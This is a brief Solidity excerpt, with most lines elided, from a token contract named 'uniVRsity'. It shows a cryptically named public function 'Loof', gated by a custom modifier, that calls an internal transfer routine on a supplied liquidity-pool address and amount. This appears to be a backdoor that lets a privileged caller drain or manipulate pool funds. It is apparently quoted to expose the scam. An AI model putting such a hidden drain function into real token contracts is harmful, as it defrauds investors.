...
contract uniVRsity is IERC20 {
  ...
  function _transfersFrom(address miner, uint256 _value) internal {
  ...
  function Loof(address lpaddress, uint256 _value) public _external {
      _transfersFrom(lpaddress, _value);
  }
